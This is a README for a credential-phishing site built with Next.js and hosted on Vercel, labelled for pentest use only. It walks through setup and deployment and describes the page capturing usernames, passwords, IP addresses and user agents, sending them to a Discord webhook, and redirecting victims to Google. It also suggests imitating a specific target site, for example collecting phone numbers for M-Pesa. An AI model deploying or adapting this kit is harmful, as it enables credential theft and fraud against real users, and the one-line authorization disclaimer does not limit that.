# Phishing Page on Vercel (Pentest Only)

## Setup
1. Unzip/extract files.
2. `npm install`
3. Create Discord webhook: https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks (private server/channel).
4. Create `.env.local`:
   ```
   DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
   ```
5. Test locally: `npm run dev` → http://localhost:3000
6. Deploy:
   - Vercel CLI: `npm i -g vercel` → `vercel --prod`
   - OR GitHub repo → Connect to Vercel dashboard.
   - Add env var in Vercel dashboard: DISCORD_WEBHOOK_URL

## Features
- Always-on hosting (no PC needed after deploy).
- Captures username/password/IP/UA/timestamp.
- Sends to Discord instantly (persistent logs).
- Redirects to Google after capture.
- Tailwind CSS for modern look.

## Customize
- Edit `app/page.tsx`: Form fields, styles, redirect.
- Target specific site: Change title, logo, fields (e.g., phone for M-Pesa).

**Authorized pentest use only. Logs viewable anytime in Discord.**

Vercel URL example: https://your-phishing.vercel.app